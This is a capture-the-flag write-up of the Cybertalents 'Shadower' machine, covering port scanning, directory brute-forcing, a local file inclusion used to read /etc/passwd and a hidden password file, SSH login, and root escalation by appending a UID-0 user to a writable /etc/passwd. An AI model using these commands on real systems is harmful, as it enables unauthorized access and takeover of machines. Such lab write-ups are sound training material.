---
title: Cybertalents Shadower Machine Writeup
author: Muhammad Adel
date: 2021-06-26 18:45:00 +0200
categories: [Cybertalents Writeups]
tags: [cybertalents, machines, box, ctf]
---

## **Description**


Get The highest privilege on the machine and find the flag!

Target IP: **35.156.4.248**

**Challenge Link:** [https://cybertalents.com/challenges/machines/shadower](https://cybertalents.com/challenges/machines/shadower)

## **User**

### **Nmap**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:24:fc:36:53:c8:0b:f7:8c:31:7a:28:dd:c9:34:02 (RSA)
|   256 6c:6e:61:94:2f:fd:f6:d2:dc:25:e3:4f:32:ac:33:15 (ECDSA)
|_  256 ce:d7:0b:19:cb:32:3b:d4:f1:bf:f7:74:8a:52:d5:bc (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```
‌
### **HTTP**

the machine is running a webserver on port 80. it doesn't have sth interesting but we can use *dirsearch* to see hidden directory.

```bash
root@kali:~/dirsearch# python3 dirsearch.py -u 35.156.4.248 -e php

  _|. _ _  _  _  _ _|_    v0.3.9
 (_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: GET | Threads: 20 | Wordlist size: 6707
Error Log: /home/itsfading/dirsearch/logs/errors-21-06-12_16-24-32.log
Target: 35.156.4.248
Output File: /home/itsfading/dirsearch/reports/35.156.4.248/_21-06-12_16-24-32.txt
[16:24:32] Starting:
[16:24:52] 200 -  827B  - /index.php
[16:24:52] 200 -   11KB - /index.html
[16:24:52] 200 -  827B  - /index.php/login/
```

Navigate to index.php we will find a hint in the page source that says LFI. So we try a simple LFI payload and we found the page is vulnerable. we can extract the */etc/passwd*.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/bash
zerotier-one:x:999:999::/var/lib/zerotier-one:/bin/sh
```
‌
We have now some interesting usernames but still we need to find a password for them. After more enumeration we will find a hint at the contact page in the page source **"<!-my0wns3cr3t.sec -->"**

‌Because we have a LFI Vulnerability we can navigate to it by adding this word in the search:

[http://35.156.4.248/index.php?view=my0wns3cr3t.sec](http://35.156.4.248/index.php?view=my0wns3cr3t.sec)

This will give us a base64 encoded which will be a secret string. now we can decoded it Using a website like **CyberChef** but you will notice that you need to decode it 20 time to get decode value. you can write script for that or to decode it manually.

Finally we will get a password ***"B100dyPa$$w0rd"***


### **SSH**

We have now a password so we can try the usernames that we have to get access to the Machine. we found that John is a valid user


```bash
root@kali:~/CyberTalents/Shadower# ssh john@35.156.4.248
john@ip-172-31-30-167:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
```

## **Root**

### **Enumeration**

We can run any automating script to search a privilege escalation vector. I will use **linPEAS**.

It leads me to know that I have a permission to write to /etc/passwd.

## **Privilege Escalation**

Simply we will create our own user with root privileges and then we will switch to it.

```bash
john@ip-172-31-30-167:~$ openssl passwd adel
fItrMJ47Bbm3E
john@ip-172-31-30-167:~$ echo 'adel:fItrMJ47Bbm3E:0:0:adel:/home/adel:/bin/bash' >> /etc/pas
john@ip-172-31-30-167:~$ su adel
Password:

root@ip-172-31-30-167:/home/john# ls
linessh.sh  lse.sh
root@ip-172-31-30-167:/home/john# cat /root/root.txt
6199b2f763edfxxxxxxxb275375c100
```
‌
You can see this resource for more information about this privilege Escalation Technique.

[https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation)](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation)
